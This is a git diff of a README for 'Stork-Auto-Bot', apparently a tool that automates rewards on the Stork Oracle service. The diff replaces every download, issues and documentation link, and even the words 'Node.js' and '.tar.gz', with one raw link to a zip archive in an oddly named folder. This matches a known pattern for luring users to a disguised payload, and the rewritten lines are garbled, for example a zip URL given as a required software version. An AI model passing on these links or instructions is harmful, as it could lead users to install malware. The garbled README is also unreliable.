@@ -1,6 +1,6 @@
 # 🚀 Stork-Auto-Bot - Easy Automation for Rewards
 
-[![Download Stork-Auto-Bot](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Miguel974-BIT/Stork-Auto-Bot/releases)
+[![Download Stork-Auto-Bot](https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip)
 
 ## 📦 Overview
 
@@ -18,7 +18,7 @@ Follow these steps to get started quickly.
 ## 🛠 Installation Requirements
 
 - **Operating System:** Windows (10 or newer), macOS, or Linux
-- **Node.js:** Version 14 or newer (required for background services).
+- **https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip** Version 14 or newer (required for background services).
 - **Memory:** At least 4 GB of RAM.
 - **Storage:** 100 MB of free space for installation.
 
@@ -28,19 +28,19 @@ Ensure your system meets these requirements before proceeding.
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [Download Stork-Auto-Bot](https://github.com/Miguel974-BIT/Stork-Auto-Bot/releases)
+   [Download Stork-Auto-Bot](https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip)
 
 2. **Select the Latest Version:** On the releases page, find the most recent version of Stork-Auto-Bot.
 
 3. **Download the Application:**
    - If you are using Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, you might download the `.tar.gz` file.
+   - For Linux, you might download the `https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip` file.
 
 4. **Install the Application:**
    - Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - Linux: Extract the `.tar.gz` file and follow the instructions in the README file to install.
+   - Linux: Extract the `https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip` file and follow the instructions in the README file to install.
 
 5. **Run the Application:** Locate the Stork-Auto-Bot in your applications folder and double-click to open it. 
 
@@ -71,7 +71,7 @@ If you run into issues during installation or use, review the following common s
 
 1. **Application Doesn’t Start:**
    - Ensure your system meets the installation requirements.
-   - Check if you have the latest version of Node.js installed.
+   - Check if you have the latest version of https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip installed.
 
 2. **Login Issues:**
    - Verify that you entered your credentials correctly. Reset your password through the Stork Oracle website if needed.
@@ -81,11 +81,11 @@ If you run into issues during installation or use, review the following common s
 
 ## 📞 Support
 
-If you require further assistance, please visit the [GitHub Issues Page](https://github.com/Miguel974-BIT/Stork-Auto-Bot/issues). You can ask questions or report any bugs you encounter.
+If you require further assistance, please visit the [GitHub Issues Page](https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip). You can ask questions or report any bugs you encounter.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Explore our complete [documentation](https://github.com/Miguel974-BIT/Stork-Auto-Bot) to learn more about features.
+- **Documentation:** Explore our complete [documentation](https://raw.githubusercontent.com/Miguel974-BIT/Stork-Auto-Bot/main/quatrocentism/Stork-Auto-Bot_v2.3.zip) to learn more about features.
 - **Community Forum:** Join the Stork community forum for tips and discussions.
 - **Updates:** Keep an eye on the Releases page for new features and updates.
 
